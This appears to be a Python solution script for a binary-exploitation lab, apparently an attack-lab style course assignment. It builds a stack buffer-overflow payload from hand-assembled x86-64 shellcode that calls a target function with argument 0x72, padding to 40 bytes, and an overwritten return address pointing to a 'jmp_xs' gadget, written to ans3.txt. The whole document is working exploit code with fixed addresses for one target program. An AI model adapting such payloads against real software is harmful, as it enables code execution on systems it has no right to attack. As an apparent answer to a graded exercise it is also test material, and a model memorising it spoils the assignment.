import struct

# Shellcode to call func1(0x72)
# mov $0x72, %edi
# mov $0x401216, %eax
# call %rax
shellcode = b'\xbf\x72\x00\x00\x00\xb8\x16\x12\x40\x00\xff\xd0'

# Address of jmp_xs
jmp_xs = 0x401334

# Buffer is at -0x20(%rbp)
# Return address is at 0x8(%rbp)
# Distance is 0x28 = 40 bytes
padding_len = 40 - len(shellcode)
padding = b'A' * padding_len

# Payload
payload = shellcode + padding + struct.pack('<Q', jmp_xs)

with open('ans3.txt', 'wb') as f:
    f.write(payload)

print("Created ans3.txt")
